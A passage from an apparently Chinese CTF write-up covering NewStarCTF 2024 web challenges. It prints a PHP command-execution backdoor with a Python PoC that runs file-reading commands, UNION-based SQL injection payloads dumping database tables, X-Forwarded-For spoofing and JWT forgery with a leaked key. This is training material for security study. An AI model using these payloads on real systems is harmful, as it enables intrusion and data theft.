class="keyword">const</span> stateElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;state&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> messageElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;message&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    form.<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">        event.<span class="title function_">preventDefault</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (stateElement.<span class="property">textContent</span>.<span class="title function_">trim</span>() !== <span class="string">&#x27;解封&#x27;</span>) &#123;</span><br><span class="line">            messageElement.<span class="property">textContent</span> = <span class="string">&#x27;如何是好？&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/flag/s34l&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">csrf_token</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;csrf_token&#x27;</span>).<span class="property">value</span> &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">                messageElement.<span class="property">textContent</span> = <span class="string">`第三部分Flag: <span class="subst">$&#123;data.flag&#125;</span>, 你解救了五条悟！下一关: /<span class="subst">$&#123;data.nextLevel || <span class="string">&#x27;无&#x27;</span>&#125;</span>`</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                messageElement.<span class="property">textContent</span> = <span class="string">&#x27;请求失败，请重试。&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            messageElement.<span class="property">textContent</span> = <span class="string">&#x27;请求过程中出现错误，请重试。&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这个<code>csrf_token</code>在上面一点点可以找到</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;seal_him&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hfaousghashgfasbasiouwrda1_&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>解封!!!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>还是用Hackbar来POST就行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/7HjuAhzvff.png"></p>
<h4 id="会赢吗？"><a href="#会赢吗？" class="headerlink" title="会赢吗？"></a>会赢吗？</h4><blockquote>
<p>会赢吗？<br>现代最强的归来，五条悟的复活宣言！<br>绝对的强者，由此而生的孤独，教会你爱的是….</p>
</blockquote>
<p>还是可以找到相应的代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;winForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/api/flag/Ap3x&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hfaousghashgfasbasiouwrda1_&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>会赢的！<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是在下面的js代码中禁用了submit操作</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">        event.<span class="title function_">preventDefault</span>();</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;宿傩的领域太强了，有什么办法让他的领域失效呢？&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> originalConsoleLog = <span class="variable language_">console</span>.<span class="property">log</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="property">log</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            originalConsoleLog.<span class="title function_">apply</span>(<span class="variable language_">console</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;你觉得你能这么简单地获取到线索？&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;)();</span><br></pre></td></tr></table></figure>

<p>所以还是掏出Hackbar</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/cloudmusic_YExlEykS7B.png"></p>
<p>最后得到flag为<code>ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9</code>，显然编码过，base64解码出来是<code>flag&#123;WA0w!_y4_r3al1y_Gr4sP_JJJs!&#125;</code></p>
<h3 id="智械危机"><a href="#智械危机" class="headerlink" title="智械危机"></a>智械危机</h3><blockquote>
<p>我家看门的robots有点铸币，怎么会告诉别人后门没有锁呢</p>
<p>【难度：中等】</p>
</blockquote>
<p>这道题，<code>robots</code>提示<code>robots.txt</code>，所以先进robots.txt看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_JyiLMRfBEC.png"></p>
<p>可以看到有个<code>backd0or.php</code>，访问一下，得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute_cmd</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt_request</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$decoded_key</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$key</span>);	<span class="comment">// $decoded_key为key的md5计算值</span></span><br><span class="line">    <span class="variable">$reversed_cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) - <span class="number">1</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">        <span class="variable">$reversed_cmd</span> .= <span class="variable">$cmd</span>[<span class="variable">$i</span>];	<span class="comment">// 使命令反向</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hashed_reversed_cmd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$reversed_cmd</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$hashed_reversed_cmd</span> !== <span class="variable">$decoded_key</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Invalid key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$decrypted_cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted_cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">execute_cmd</span>(<span class="title function_ invoke__">decrypt_request</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里要成功执行命令有两个点</p>
<ul>
<li>需要执行的命令放在<code>cmd</code>中，且需要用base64编码一次</li>
<li>需要执行的命令的base64反向（即<code>ls</code>的<code>bHM=</code>变成<code>=MHb</code>）的md5哈希值再base64编码后放在<code>key</code>里面</li>
</ul>
<p>这里先尝试跑一个<code>ls</code>，<code>ls</code>经过b64编码为<code>bHM=</code>，然后再跑一个<code>ls</code>的b64逆向后md5再b64编码，结果为<code>N2FiZThiMjRiZDAxMzc0NDZmZDMzNmMyMjk4ZmNjYTA=</code>，发现<code>ls</code>命令可以正常执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_70NCbyYKdv.png"></p>
<p>所以我们现在要开始找flag的位置，先构建shell命令<code>find / -iname &quot;flag&quot;</code>，所以<code>cmd</code>传入为<code>ZmluZCAvIC1pbmFtZSAiZmxhZyI=</code></p>
<p>再把上面这个b64编码结果反向一下后md5再b64，得到<code>MWQ4M2Y1MmNhMDk1ZjYwNGVhY2IwOGNjZDRmZWRhOTM=</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_cnNe0iiutK.png"></p>
<p>运行后可以发现flag在<code>/flag</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_qWkqpM6T6r.png"></p>
<p>再用同样的方式，执行的命令为<code>cat /flag</code>，b64编码后为<code>Y2F0IC9mbGFn</code>，key编码后为<code>ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI=</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_MdaJtyN8cy.png"></p>
<p>附上POC构造脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line"></span><br><span class="line">cmd = base64.b64encode(command.encode())</span><br><span class="line">key = base64.b64encode(hashlib.md5(cmd[::-<span class="number">1</span>]).hexdigest().encode())</span><br><span class="line"></span><br><span class="line">poc = <span class="string">f&quot;cmd=<span class="subst">&#123;cmd.decode()&#125;</span>&amp;key=<span class="subst">&#123;key.decode()&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(poc)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_JwO7hOTJoC.png"></p>
<h3 id="谢谢皮蛋"><a href="#谢谢皮蛋" class="headerlink" title="谢谢皮蛋"></a>谢谢皮蛋</h3><blockquote>
<p>让我皮蛋看看Flag都藏哪了</p>
<p>【难度：困难】</p>
</blockquote>
<div class="note info flat"><p>这题谁出的呀太搞了hhhhhhhhh</p>
<p>Cypher: Where is everyone hiding???</p>
<p>Wingman: Pew pew~</p>
</div>

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/wipher.jpg" style="zoom: 25%;" />

<p>在控制台中可以看到注释给了提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_2hVGlPhGQd.png"></p>
<p>提示里面告诉我们了解一下联合注入，我尝试了一下id&#x3D;<code>base64(1 UNION SELECT TABLE_NAME, TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = database(); --)</code>（注：本文中<code>base64()</code>指用base64方式编码内部字符）</p>
<p>然后会发现返回了保安的位置，但是我要查询的数据库内的表格没出来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_rOAb22lJYA.png"></p>
<p>所以我估计是虽然我注释掉了<code>LIMIT</code>，但是PHP里面只接受一组结果，所以得让前面的查询无返回</p>
<p>经过我测试得知，id&#x3D;1可以得到保安的位置，id&#x3D;4可以得到奶妈的位置，所以避开这两个数字就行了</p>
<p>然后传入id&#x3D;<code>base64(10 UNION SELECT TABLE_NAME, TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = database(); --)</code>，可以得到结果</p>
<blockquote>
<p>Name: “Fl4g”<br>Position: “Fl4g”</p>
</blockquote>
<p>接着就是查询这个表中的列，传入id&#x3D;<code>base64(10 UNION SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR &quot;, &quot;), GROUP_CONCAT(COLUMN_NAME SEPARATOR &quot;, &quot;) AS combined_info FROM information_schema.columns WHERE TABLE_SCHEMA = database() AND TABLE_NAME = &quot;Fl4g&quot; --)</code>后，可以得到<code>Fl4g</code>表格中拥有<code>id</code>、<code>des</code>、<code>value</code>列</p>
<blockquote>
<p>Name: “id, des, value”<br>Position: “id, des, value”</p>
</blockquote>
<p>然后我们再去查询<code>des</code>和<code>value</code>，传入id&#x3D;<code>base64(10 UNION SELECT des, value FROM Fl4g --)</code>，得到最终的结果</p>
<blockquote>
<p>Name: “C0ngratu1ati0ns!”<br>Position: “flag{36218e97-ec08-4b21-80c8-50ddfca4f026}”</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_DVTlDORVb8.png"></p>
<h3 id="PangBai-过家家（1）"><a href="#PangBai-过家家（1）" class="headerlink" title="PangBai 过家家（1）"></a>PangBai 过家家（1）</h3><blockquote>
<p>今天我去孤儿院接走了 PangBai，孤儿院的老板连手续都没让我办，可是我一抱起 PangBai，她就嚎啕大哭起来，我陷入了信任危机，于是我打开了婴幼儿护理专业必读书目《图解 HTTP》。</p>
<p>（本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为<a href="http://ip:port/）">http://ip:port/）</a></p>
<p>【难度：中等】</p>
</blockquote>
<div class="note info flat"><p>这题的截图中的IP地址和端口会不一样，因为我后面重开容器了，主要是因为UA那一关没过，当时没搞出来是什么问题，后来发现是我在学校多设备上网在Openwrt里面改了UA，所以会一直导致不过</p>
</div>

<h4 id="Level-1-初出茅庐"><a href="#Level-1-初出茅庐" class="headerlink" title="Level 1: 初出茅庐"></a><strong>Level 1: 初出茅庐</strong></h4><blockquote>
<p>教育孩子的第一步，就是学会如何倾听他们的声音。</p>
<p>PangBai 的头部（Header）里便隐藏着一些秘密，需要你主动去发现。</p>
</blockquote>
<p>按下F12可以看到响应头里面有个location，就可以进入Level2了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_R8nzhIpu4T.png"></p>
<h4 id="Level-2-云程发轫"><a href="#Level-2-云程发轫" class="headerlink" title="Level 2: 云程发轫"></a>Level 2: 云程发轫</h4><blockquote>
<p>有时主动的沟通，胜如缜密的推理。<br>正确的沟通会使事物朝着顺心的方向发展。</p>
<p>向 PangBai 询问（Query）一下（ask&#x3D;miao）吧 ~</p>
</blockquote>
<p>这里要我们传入query值，我们在网址后面加上<code>?ask=miao</code></p>
<h4 id="Level-3-探赜索隐"><a href="#Level-3-探赜索隐" class="headerlink" title="Level 3: 探赜索隐"></a>Level 3: 探赜索隐</h4><blockquote>
<p>理解是深入的途径，将心比心是有效沟通的方法论。<br>与孩子沟通的方式并不唯一，先入后导，顺其者自然。</p>
<p>用另一种方法（Method）打声招呼（say&#x3D;hello）吧 ~</p>
</blockquote>
<p>意思是用POST方法传入<code>say=hello</code>，用Hackbar就能搞定</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_MnVDzYPcpp.png"></p>
<h4 id="Level-4-不悱不发"><a href="#Level-4-不悱不发" class="headerlink" title="Level 4: 不悱不发"></a>Level 4: 不悱不发</h4><blockquote>
<p>不愤不启，不悱不发。因势利导，顺势而为。</p>
<p>你需要使用正确的方法（Method）来与 PangBai 沟通。</p>
</blockquote>
<p>这里说我们要用正确的方法沟通，尝试最常用的<code>GET</code>和<code>POST</code>，发现<code>POST</code>是对的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Yakit_5tyoTT7sQS.png"></p>
<p>然后告诉我们<code>User-Agent</code>要是<code>Papa/1.1</code>，所以我们改下UA。</p>
<h4 id="Level-5-渐入佳境"><a href="#Level-5-渐入佳境" class="headerlink" title="Level 5: 渐入佳境"></a>Level 5: 渐入佳境</h4><blockquote>
<p>发现症结，直面矛盾。实事求是，平心相待。</p>
<p>PangBai 依然对你比较警惕，因此「玛卡巴卡阿卡哇卡米卡玛卡呣」或许是不可省略的。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_Es9yyFLgu0.png"></p>
<p>这里以为有个302设置cookie的过程，所以会弹回去GET请求，我们用工具再改成POST请求</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Yakit_uTgfVoOO6g.png"></p>
<p>然后告诉我们要用PATCH方法提交一个补丁包，因为在yakit和burpsuite我没找到怎么发送patch请求，然后我用了Python</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8.147.132.32:36002/?ask=miao&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6NX0.iHo5yUb8pak_0HbVHMt8yCzWsm5qBsq0573VWH2ElCk; Max-Age=86400; Path=/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Dnt&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://8.147.132.32:36002/?ask=miao&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Papa/1.0&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;filename.zip&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;empty.zip&quot;</span>, <span class="string">&quot;rb&quot;</span>))&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;say&quot;</span>: <span class="string">&quot;玛卡巴卡阿卡哇卡米卡玛卡呣&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">response = session.patch(url, headers=headers, files=files, data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;html: &quot;</span>, response.text)</span><br><span class="line"><span class="built_in">print</span>(session.cookies)</span><br></pre></td></tr></table></figure>

<p>这里的<code>empty.zip</code>是我随便新建的一个空的压缩文件，上传上去就有了，然后可以得到token</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_Ld9QSq29Cg.png"></p>
<h4 id="Level-6-一方通行"><a href="#Level-6-一方通行" class="headerlink" title="Level 6: 一方通行"></a>Level 6: 一方通行</h4><blockquote>
<p>「君子素其位而行，不愿乎其外。」<br>——《中庸·第十四章》</p>
<p>还在等什么？距离成为 PangBai 的亲人（localhost）只有一步之遥了呢！<br>这里的前方是一方通行啊！Level 6 可不是容易的！</p>
</blockquote>
<p>提示我们要来自localhost，所以改X-Forwarded-For，可以通过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_gN4VmKq7ZK.png"></p>
<blockquote>
<p>你似乎无法抵御这种感觉的萦绕，像是一瞬间被推入到无法言喻的深渊。尽管你尽力摆脱，但即便今后夜间偶见酣眠，这一瞬间塑成的梦魇也成为了美梦的常客。<br>「像■■■■验体■■不可能■■■■ JWT 这种■■ Kjbikdq4AKSIwzT4 ■■■密钥，除非■■■■■走，难道■■■■■■吗？！」<br>「……」</p>
</blockquote>
<p>我们得到了个密钥为<code>Kjbikdq4AKSIwzT4</code>，也提示我们是JWT了，我们拿去验证一下，发现可以通过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_UwFhkx3vkV.png"></p>
<p>然后我就修改了<code>level</code>后面的值为<code>7</code>，得到<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6N30.NrNzsxizJ8-EX3YYl93lJWWZ_8YvxBHGH17J4QC3Cd4</code>，放进cookie里发现没有第七关</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_qHcVw8BMsy.png"></p>
<p>然后改了个0，出来了……</p>
<h4 id="Level-0-此心安处是吾乡"><a href="#Level-0-此心安处是吾乡" class="headerlink" title="Level 0: 此心安处是吾乡"></a>Level 0: 此心安处是吾乡</h4><blockquote>
<p>平凡的普通人，是世界的基调。无数平凡的人们，书写了波澜壮阔的历史。</p>
<p>「我将无我，不负人民。」</p>
<p>「PangBai！危险！PangBai！！PangBai！！！」从梦中醒来</p>
</blockquote>
<p>在浏览器打开的时候，<code>从梦中醒来</code>这几个字可以点，然后就进入了剧情……</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/explorer_zxDPpHdqFj.png"></p>
<h3 id="你能在一秒内打出八句英文吗"><a href="#你能在一秒内打出八句英文吗" class="headerlink" title="你能在一秒内打出八句英文吗"></a>你能在一秒内打出八句英文吗</h3><blockquote>
<p>题目内容：</p>
<p>CAN YOU TRY</p>
<p>【难度：签到】</p>
</blockquote>
<p>打开来是个网页，点击<code>I Can</code>就能够进入挑战，看起来这题是脚本题，所以写个脚本</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_V5wKatj3BM.png"></p>
